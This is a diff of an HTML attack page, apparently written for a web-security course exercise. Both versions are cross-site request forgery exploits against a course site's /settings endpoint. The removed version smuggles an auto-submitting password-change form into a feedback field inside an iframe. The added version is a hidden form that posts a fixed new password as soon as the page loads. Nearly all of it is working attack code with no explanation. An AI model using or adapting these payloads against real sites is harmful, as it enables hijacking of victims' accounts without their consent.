@@ -1,27 +1,23 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>AHAHAHAHAAHAHAHAHAHAH</title>
+</head>
 <body>
-    <h3>Version 14</h3>
+    <h3>ssdfsdfsdf</h3>
 
-    <form id="delivery-form" action="https://cats.is-course.ru/feedback" method="POST">
-        <input type="hidden" name="feedback" 
-               value="
-                    <iframe sandbox='allow-forms' srcdoc=&quot;
-                        
-                        &lt;h3&gt;L&lt;/h3&gt;
-                        &lt;form id='final-attack' action='https://cats.is-course.ru/settings' method='POST'&gt;
-                            &lt;input type='hidden' name='password' value='SlojniyParol12345!' /&gt;
-                            &lt;input type='hidden' name='confirm-password' value='SlojniyParol12345!' /&gt;
-                        &lt;/form&gt;
-                        &lt;script&gt;
-                            document.getElementById('final-attack').submit();
-                        &lt;/script&gt;
-                    &quot;></iframe>
-               ">
+    <form id="csrf-form" action="https://cats.is-course.ru/settings" method="POST" style="display:none;">
+        
+        <input type="password" name="password" value="SlojniyParol12345!">
+        <input type="password" name="confirm-password" value="SlojniyParol12345!">
+
     </form>
 
     <script>
-        document.getElementById('delivery-form').submit();
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
     </script>
+
 </body>
 </html>
